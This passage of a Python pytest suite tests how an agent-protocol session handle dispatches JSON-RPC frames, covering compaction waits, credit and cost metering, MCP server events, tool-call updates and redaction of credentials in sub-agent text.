        context_pct=75.0,
        context_used_tokens=150_000,
        context_window_tokens=200_000,
        context_tokens_from_usage=True,
    )
    stray = JsonRpcMessage(method="session/update", params={"sessionId": "sA", "update": {}})
    q["sA"].put_nowait(stray)  # buffered by the OUTER wait loop
    q["sA"].put_nowait(
        JsonRpcMessage(
            method=METHOD_COMPACTION_STATUS,
            params={"sessionId": "sA", "status": {"type": "completed"}, "summary": "ok"},
        )
    )
    q["sA"].put_nowait(None)  # death consumed by the NESTED drain

    result = await handle.wait_for_compaction(timeout=3.0)

    assert result["type"] == "completed"
    assert q["sA"].get_nowait() is stray
    assert q["sA"].get_nowait() is None


@pytest.mark.asyncio
async def test_drain_passes_metering_frames_through_for_next_turn_billing():
    """A late meteringUsage frame must NOT be consumed by the grace drain —
    on the between-turns auto-compact path the credits would land in a stats
    window nothing reads and be wiped by the next prompt's re-init. The frame
    is re-queued untouched so the next turn's dispatch loop bills it."""
    from kiro_crew.acp.types import (
        METHOD_COMPACTION_STATUS,
        AcpPromptStats,
        JsonRpcMessage,
    )

    rt, _reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle.last_prompt_stats = AcpPromptStats(
        context_pct=90.0,
        context_used_tokens=900_000,
        context_window_tokens=1_000_000,
        context_tokens_from_usage=True,
    )
    metering = JsonRpcMessage(
        method="_kiro.dev/metadata",
        params={"sessionId": "sA", "meteringUsage": [{"unit": "credit", "amount": 0.5}]},
    )
    q["sA"].put_nowait(
        JsonRpcMessage(
            method=METHOD_COMPACTION_STATUS,
            params={"sessionId": "sA", "status": {"type": "completed"}, "summary": "ok"},
        )
    )
    q["sA"].put_nowait(metering)
    q["sA"].put_nowait(
        JsonRpcMessage(
            method="_kiro.dev/metadata",
            params={"sessionId": "sA", "contextUsagePercentage": 5.0},
        )
    )

    result = await handle.wait_for_compaction(timeout=3.0)

    assert result["type"] == "completed"
    stats = handle.last_prompt_stats
    # The pct frame WAS applied...
    assert stats.context_pct == 5.0
    # ...but the metering frame was neither billed to the dead window nor lost:
    assert stats.credits == 0.0
    assert q["sA"].get_nowait() is metering


@pytest.mark.asyncio
async def test_wait_for_compaction_cached_result_applies_post_compaction_metadata():
    """The mid-turn cached path (compact() captured the completed status while
    draining its own prompt) must also grace-drain for the metadata."""
    from kiro_crew.acp.types import AcpPromptStats, JsonRpcMessage

    rt, _reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    # The dispatch loop already reset the stats when it captured the result.
    handle.last_prompt_stats = AcpPromptStats(
        context_pct=0.0,
        context_used_tokens=0,
        context_window_tokens=1_000_000,
        context_tokens_from_usage=False,
    )
    handle._compact_result = {"type": "completed", "summary": "ok"}
    q["sA"].put_nowait(
        JsonRpcMessage(
            method="_kiro.dev/metadata",
            params={"sessionId": "sA", "contextUsagePercentage": 5.0},
        )
    )

    result = await handle.wait_for_compaction(timeout=3.0)

    assert result["type"] == "completed"
    stats = handle.last_prompt_stats
    assert stats.context_pct == 5.0
    assert stats.context_used_tokens == 50_000


@pytest.mark.asyncio
async def test_wait_for_compaction_timeout_restores_a_concurrent_frame():
    """RECOVERY contract for a compaction that never reports terminal.

    ``wait_for_compaction`` returning ``{"type": "timeout"}`` means only that
    THIS reader did not observe a completed/failed status inside its window --
    NOT that the provider never sent one. A live turn can be draining the same
    session queue concurrently; the wait must therefore not SWALLOW the frames
    it pulls while looking for the status, or the next legal turn (or the live
    turn's own dispatch loop) is stranded -- the exact "stuck after a timed-out
    /compact" shape. This pins that a non-compaction frame observed during a
    wait that then times out is RESTORED to the queue, so the following reader
    still sees it. (It does not, and cannot, prove the historical incident was
    this race -- only that the reader does not drop a concurrent frame on the
    timeout path.)
    """
    from kiro_crew.acp.types import AcpPromptStats, JsonRpcMessage

    rt, _reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle.last_prompt_stats = AcpPromptStats(
        context_pct=50.0,
        context_used_tokens=100_000,
        context_window_tokens=200_000,
        context_tokens_from_usage=True,
    )
    # A frame belonging to a concurrent live turn, and NO compaction status
    # behind it: the status the provider may have sent was consumed elsewhere
    # (or never arrived within the window). The wait must time out AND hand the
    # live-turn frame back.
    live_frame = JsonRpcMessage(
        method="session/update", params={"sessionId": "sA", "update": {"live": True}}
    )
    q["sA"].put_nowait(live_frame)

    result = await handle.wait_for_compaction(timeout=0.3)

    assert result == {"type": "timeout"}
    # The concurrent frame is back on the queue for the next reader, not dropped.
    assert q["sA"].get_nowait() is live_frame


@pytest.mark.asyncio
async def test_dispatch_agent_switched():
    """Agent switched notification yields EVENT_AGENT_SWITCHED."""
    from kiro_crew.acp.types import EVENT_AGENT_SWITCHED, METHOD_AGENT_SWITCHED

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_AGENT_SWITCHED,
                "params": {
                    "sessionId": "sA",
                    "agentName": "kirocrew-lite",
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        sw = [e for e in events if e.kind == EVENT_AGENT_SWITCHED]
        assert len(sw) == 1 and sw[0].text == "kirocrew-lite"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_mcp_oauth_request():
    """MCP OAuth request notification yields EVENT_MCP_OAUTH_REQUEST."""
    from kiro_crew.acp.types import EVENT_MCP_OAUTH_REQUEST, METHOD_MCP_OAUTH_REQUEST

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_MCP_OAUTH_REQUEST,
                "params": {
                    "sessionId": "sA",
                    "serverName": "github-mcp",
                    "oauthUrl": "https://auth.example.com",
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        oauth = [e for e in events if e.kind == EVENT_MCP_OAUTH_REQUEST]
        assert len(oauth) == 1
        assert oauth[0].server_name == "github-mcp"
        assert oauth[0].oauth_url == "https://auth.example.com"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_mcp_server_initialized():
    """MCP server initialized yields EVENT_MCP_SERVER_INITIALIZED."""
    from kiro_crew.acp.types import EVENT_MCP_SERVER_INITIALIZED, METHOD_MCP_SERVER_INITIALIZED

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_MCP_SERVER_INITIALIZED,
                "params": {
                    "sessionId": "sA",
                    "serverName": "builder-mcp",
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        init = [e for e in events if e.kind == EVENT_MCP_SERVER_INITIALIZED]
        assert len(init) == 1 and init[0].server_name == "builder-mcp"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_mcp_server_init_failure():
    """MCP server init failure yields EVENT_MCP_SERVER_INIT_FAILURE."""
    from kiro_crew.acp.types import EVENT_MCP_SERVER_INIT_FAILURE, METHOD_MCP_SERVER_INIT_FAILURE

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_MCP_SERVER_INIT_FAILURE,
                "params": {
                    "sessionId": "sA",
                    "serverName": "bad-mcp",
                    "error": "timeout",
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        fail = [e for e in events if e.kind == EVENT_MCP_SERVER_INIT_FAILURE]
        assert len(fail) == 1 and fail[0].server_name == "bad-mcp" and fail[0].text == "timeout"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_unknown_server_request_gets_error_response():
    """Unknown server→client request gets a -32601 error response."""
    rt, reader, proc = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        # Unknown method WITH an id (server request, not notification)
        _feed(reader, {"id": 9999, "method": "unknown/method", "params": {"sessionId": "sA"}})
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        # Check that an error response was sent back
        calls = proc.stdin.write.call_args_list
        error_sent = False
        for call in calls:
            data = json.loads(call.args[0].decode())
            if data.get("id") == 9999 and "error" in data:
                assert data["error"]["code"] == JSONRPC_METHOD_NOT_FOUND
                error_sent = True
        assert error_sent, "Expected -32601 error response for unknown server request"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_tool_call_update_raw_output():
    """tool_call_update with rawOutput yields EVENT_TOOL_RESULT."""
    from kiro_crew.acp.types import EVENT_TOOL_RESULT

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {
                        "sessionUpdate": "tool_call_update",
                        "toolCallId": "tc2",
                        "rawOutput": {"items": [{"Text": "raw stuff"}]},
                    },
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        tr = [e for e in events if e.kind == EVENT_TOOL_RESULT]
        assert len(tr) == 1 and tr[0].tool_output == "raw stuff"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_tool_call_update_refinement():
    """tool_call_update with title but no content yields EVENT_TOOL_CALL_UPDATE."""
    from kiro_crew.acp.types import EVENT_TOOL_CALL_UPDATE

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {
                        "sessionUpdate": "tool_call_update",
                        "toolCallId": "tc3",
                        "title": "Reading file",
                        "kind": "fs",
                        "rawInput": "/etc/hosts",
                    },
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        tu = [e for e in events if e.kind == EVENT_TOOL_CALL_UPDATE]
        assert len(tu) == 1
        assert tu[0].title == "Reading file"
        assert tu[0].tool_input == "/etc/hosts"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_usage_update():
    """usage_update sets context stats on last_prompt_stats."""
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:

        async def drive():
            async for _ in handle.prompt("hi", timeout=3.0):
                pass

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {
                        "sessionUpdate": "usage_update",
                        "usage": {"used": 5000, "size": 10000},
                    },
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        assert handle.last_prompt_stats.context_pct == 50.0
        assert handle.last_prompt_stats.context_used_tokens == 5000
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_cost_and_prompt_tokens_reach_event_complete():
    """claude seam billing: a session-cumulative usage_update cost and the
    PromptResponse token counts are delta'd/folded into last_prompt_stats and
    surfaced on EVENT_COMPLETE.usage. Two turns
    prove the delta: turn 2 is billed only its own movement of the cumulative
    counter, and its own token counts."""
    from kiro_crew.acp.types import EVENT_COMPLETE

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:

        async def run_turn(cost_amount, input_tokens, output_tokens):
            events: list = []

            async def drive():
                async for ev in handle.prompt("hi", timeout=3.0):
                    events.append(ev)

            driver = asyncio.ensure_future(drive())
            req_id = (await _await_routed(rt, "sA"))["sA"]
            _feed(
                reader,
                {
                    "method": METHOD_SESSION_UPDATE,
                    "params": {
                        "sessionId": "sA",
                        "update": {
                            "sessionUpdate": "usage_update",
                            "used": 5000,
                            "size": 10000,
                            "cost": {"amount": cost_amount, "currency": "USD"},
                        },
                    },
                },
            )
            _feed(
                reader,
                {
                    "id": req_id,
                    "result": {
                        "stopReason": "end_turn",
                        "inputTokens": input_tokens,
                        "outputTokens": output_tokens,
                        "cachedReadTokens": 7,
                        "cachedWriteTokens": 3,
                    },
                },
            )
            await await_until(driver, what="the driver finishing its turn")
            (complete,) = [ev for ev in events if ev.kind == EVENT_COMPLETE]
            return complete

        first = await run_turn(0.30, 100, 50)
        assert first.usage.cost_usd == pytest.approx(0.30)
        assert first.usage.input_tokens == 100
        assert first.usage.output_tokens == 50
        assert first.usage.cache_read_tokens == 7
        assert first.usage.cache_creation_tokens == 3

        # Turn 2: the cumulative counter moved 0.30 -> 0.50, so this turn's
        # cost is the 0.20 delta, and the token counts are its own, not a sum.
        second = await run_turn(0.50, 40, 20)
        assert second.usage.cost_usd == pytest.approx(0.20)
        assert second.usage.input_tokens == 40
        assert second.usage.output_tokens == 20
    finally:
        await _stop_reader(task)


@pytest.mark.parametrize(
    "cost",
    [
        "0.5",  # cost not dict-shaped
        {"amount": "0.5"},
        {"amount": True},
        {"amount": float("nan")},
        {"amount": -0.01},
        {"amount": 10**400},
    ],
)
def test_handle_update_malformed_cost_is_noop(cost):
    """A malformed agent-supplied cost must degrade to absent at the
    parse_usage_cost chokepoint — no exception inside the prompt-turn dispatch
    path, and no stats movement."""
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    msg = JsonRpcMessage(
        method=METHOD_SESSION_UPDATE,
        params={
            "sessionId": "sA",
            "update": {"sessionUpdate": "usage_update", "used": 1, "size": 2, "cost": cost},
        },
    )
    events = handle._handle_update(msg)  # must not raise
    assert events == []
    assert handle.last_prompt_stats.cost_usd == 0.0
    assert handle.last_prompt_stats.cost_session_usd == 0.0


@pytest.mark.parametrize(
    "used,size",
    [
        ("5000", "10000"),  # numeric strings
        (float("inf"), 10000),
        (float("nan"), float("nan")),
        (10**400, 10000),  # bignum: math.isfinite itself raises OverflowError
        ([5000], {"n": 1}),
        (True, True),
    ],
)
def test_handle_update_malformed_usage_is_noop(used, size):
    """The session-handle path consumes the same agent-supplied usage_update as
    AcpClient. parse_usage_update validates at the shared chokepoint, so a
    malformed used/size must be a no-op here too — not a TypeError/
    OverflowError inside the prompt-turn dispatch."""
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    msg = JsonRpcMessage(
        method=METHOD_SESSION_UPDATE,
        params={
            "sessionId": "sA",
            "update": {"sessionUpdate": "usage_update", "used": used, "size": size},
        },
    )
    events = handle._handle_update(msg)  # must not raise
    assert events == []
    assert handle.last_prompt_stats.context_pct == 0.0
    assert handle.last_prompt_stats.context_used_tokens == 0


@pytest.mark.asyncio
async def test_dispatch_metadata_credits():
    """_kiro.dev/metadata meteringUsage(unit=credit) accumulates into last_prompt_stats
    and is propagated onto EVENT_COMPLETE; non-credit units are ignored."""
    from kiro_crew.acp.types import EVENT_COMPLETE, METHOD_METADATA

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events: list = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_METADATA,
                "params": {
                    "sessionId": "sA",
                    "contextUsagePercentage": 12.5,
                    "meteringUsage": [
                        {"unit": "credit", "value": 1.0},
                        {"unit": "token", "value": 999},  # not a credit — ignored
                        {"unit": "credit", "value": 0.23},
                    ],
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        assert handle.last_prompt_stats.credits == pytest.approx(1.23)
        assert handle.last_prompt_stats.context_pct == 12.5
        complete = [e for e in events if e.kind == EVENT_COMPLETE]
        assert complete and complete[-1].usage.credits == pytest.approx(1.23)
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_metadata_credits_robust():
    """Non-numeric / missing meteringUsage values and metadata with no meteringUsage
    are handled without raising; credits stays 0."""
    from kiro_crew.acp.types import METHOD_METADATA

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:

        async def drive():
            async for _ in handle.prompt("hi", timeout=3.0):
                pass

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_METADATA,
                "params": {
                    "sessionId": "sA",
                    "meteringUsage": [{"unit": "credit", "value": "oops"}, {"unit": "credit"}],
                },
            },
        )
        _feed(
            reader, {"method": METHOD_METADATA, "params": {"sessionId": "sA"}}
        )  # no meteringUsage
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        assert handle.last_prompt_stats.credits == 0.0
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_metadata_credits_routed_per_session():
    """Concurrent sessions on one runtime each accrue only their own kiro credits —
    metadata notifications are demuxed by sessionId, no cross-talk."""
    from kiro_crew.acp.types import METHOD_METADATA

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA", "sB")
    handle_a = AcpSessionHandle("sA", q["sA"], rt)
    handle_b = AcpSessionHandle("sB", q["sB"], rt)
    task = await _start_reader(rt)

    async def drive(handle):
        async for _ in handle.prompt("go", timeout=5.0):
            pass

    da = asyncio.ensure_future(drive(handle_a))
    db = asyncio.ensure_future(drive(handle_b))
    try:
        sid_to_req = await _await_routed(rt, "sA", "sB")
        assert set(sid_to_req) == {"sA", "sB"}, "both prompts must be in flight"

        _feed(
            reader,
            {
                "method": METHOD_METADATA,
                "params": {
                    "sessionId": "sA",
                    "meteringUsage": [{"unit": "credit", "value": 2.0}],
                },
            },
        )
        _feed(
            reader,
            {
                "method": METHOD_METADATA,
                "params": {
                    "sessionId": "sB",
                    "meteringUsage": [{"unit": "credit", "value": 0.5}],
                },
            },
        )
        _feed(reader, {"id": sid_to_req["sA"], "result": {"stopReason": "end_turn"}})
        _feed(reader, {"id": sid_to_req["sB"], "result": {"stopReason": "end_turn"}})
        await await_until(asyncio.gather(da, db), what="every driver finishing its turn")

        assert handle_a.last_prompt_stats.credits == pytest.approx(2.0)
        assert handle_b.last_prompt_stats.credits == pytest.approx(0.5)
    finally:
        for t in (da, db):
            if not t.done():
                t.cancel()
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_subagent_list():
    """Subagent list notification yields EVENT_SUBAGENT_LIST."""
    from kiro_crew.acp.types import EVENT_SUBAGENT_LIST, METHOD_SUBAGENT_LIST_UPDATE

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_SUBAGENT_LIST_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "subagents": [{"id": "sub1"}],
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        sl = [e for e in events if e.kind == EVENT_SUBAGENT_LIST]
        assert len(sl) == 1 and sl[0].subagents == [{"id": "sub1"}]
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_subagent_activity_tool():
    """Subagent activity with toolCallId yields EVENT_SUBAGENT_ACTIVITY.

    The kiro frame's params.sessionId is the SUB-session id (not the parent's
    registered session), so the reader would correctly drop it. We inject it
    straight into the parent's queue to exercise the dispatch branch.
    """
    from kiro_crew.acp.types import EVENT_SUBAGENT_ACTIVITY, METHOD_KIRO_SESSION_UPDATE

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        q["sA"].put_nowait(
            JsonRpcMessage.from_dict(
                {
                    "method": METHOD_KIRO_SESSION_UPDATE,
                    "params": {
                        "sessionId": "sub-1",
                        "update": {"toolCallId": "tc5", "title": "read file"},
                    },
                }
            )
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        sa = [e for e in events if e.kind == EVENT_SUBAGENT_ACTIVITY]
        assert len(sa) == 1
        assert sa[0].sub_session_id == "sub-1"
        assert sa[0].tool_call_id == "tc5"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_subagent_activity_text():
    """Subagent activity with agent_message_chunk yields text event."""
    from kiro_crew.acp.types import EVENT_SUBAGENT_ACTIVITY, METHOD_KIRO_SESSION_UPDATE

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        q["sA"].put_nowait(
            JsonRpcMessage.from_dict(
                {
                    "method": METHOD_KIRO_SESSION_UPDATE,
                    "params": {
                        "sessionId": "sub-2",
                        "update": {
                            "sessionUpdate": "agent_message_chunk",
                            "text": "hello from sub",
                        },
                    },
                }
            )
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        sa = [e for e in events if e.kind == EVENT_SUBAGENT_ACTIVITY]
        assert len(sa) == 1
        assert sa[0].text == "hello from sub"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_subagent_activity_text_is_redacted():
    """Sub-agent streamed text is LLM output surfaced on the dashboard, so it
    MUST be scrubbed (credentials + exfil URLs) before being yielded."""
    from kiro_crew.acp.types import EVENT_SUBAGENT_ACTIVITY, METHOD_KIRO_SESSION_UPDATE

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        q["sA"].put_nowait(
            JsonRpcMessage.from_dict(
                {
                    "method": METHOD_KIRO_SESSION_UPDATE,
                    "params": {
                        "sessionId": "sub-3",
                        "update": {
                            "sessionUpdate": "agent_message_chunk",
                            "text": "leaked AKIAIOSFODNN7EXAMPLE key",
                        },
                    },
                }
            )
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        sa = [e for e in events if e.kind == EVENT_SUBAGENT_ACTIVITY]
        assert len(sa) == 1
        assert "AKIAIOSFODNN7EXAMPLE" not in sa[0].text
        assert "[REDACTED: credential]" in sa[0].text
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_subagent_activity_ignores_this_session():
    """The extension spelling naming THIS session yields no sub-agent activity.

    kiro-cli carries the parent turn's own ``tool_call_chunk`` on
    ``_kiro.dev/session/update`` with ``params.sessionId`` set to the parent's
    session -- the same method a child's update arrives on -- so the sessionId is
    the only thing separating the two. Treating the parent's frame as a child's
    puts a sub-agent on the session the user is already watching, with that
    session's own id, once per tool call. Recorded live in
    ``test/fixtures/acp_frames/kiro/session.jsonl``.
    """
    from kiro_crew.acp.types import EVENT_SUBAGENT_ACTIVITY, METHOD_KIRO_SESSION_UPDATE

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        q["sA"].put_nowait(
            JsonRpcMessage.from_dict(
                {
                    "method": METHOD_KIRO_SESSION_UPDATE,
                    "params": {
                        "sessionId": "sA",
                        "update": {
                            "sessionUpdate": "tool_call_chunk",
                            "toolCallId": "tc-own",
                            "title": "shell",
                            "kind": "execute",
                        },
                    },
                }
            )
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        assert [e for e in events if e.kind == EVENT_SUBAGENT_ACTIVITY] == []
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_subagent_activity_ignores_this_session_text():
    """Same scoping for the text carrier, so one guard cannot cover half the shape."""
    from kiro_crew.acp.types import EVENT_SUBAGENT_ACTIVITY, METHOD_KIRO_SESSION_UPDATE

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        q["sA"].put_nowait(
            JsonRpcMessage.from_dict(
                {
                    "method": METHOD_KIRO_SESSION_UPDATE,
                    "params": {
                        "sessionId": "sA",
                        "update": {
                            "sessionUpdate": "agent_message_chunk",
                            "text": "the parent's own streamed text",
                        },
                    },
                }
            )
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        assert [e for e in events if e.kind == EVENT_SUBAGENT_ACTIVITY] == []
    finally:
        await _stop_reader(task)


# ── Error during prompt turn ──


@pytest.mark.asyncio
async def test_prompt_error_response_raises():
    """An error response for the prompt request raises AcpError."""
    from kiro_crew.acp.client import AcpError

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:

        async def drive():
            async for _ in handle.prompt("hi", timeout=3.0):
                pass

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(reader, {"id": req_id, "error": {"code": -1, "message": "throttled"}})
        with pytest.raises(AcpError):
            await await_until(driver, what="the driver finishing its turn")
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_prompt_transient_error_sets_transient_flag():
    """A transient backend 5xx error response (a mid-stream InternalServerError
    surfaced as JSON-RPC -32603) raises AcpError with transient=True, so the
    chat_runner / llm_helpers retry ladder fires instead of a bare error card."""
    from kiro_crew.acp.client import AcpError

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:

        async def drive():
            async for _ in handle.prompt("hi", timeout=3.0):
                pass

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "id": req_id,
                "error": {
                    "code": -32603,
                    "message": "Internal error",
                    "data": (
                        "Encountered an error in the response stream: "
                        "CodewhispererChatResponseStream(ServiceError(InternalServerError "
                        '{ message: "...please try again." }))'
                    ),
                },
            },
        )
        with pytest.raises(AcpError) as excinfo:
            await await_until(driver, what="the driver finishing its turn")
        assert excinfo.value.transient is True
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
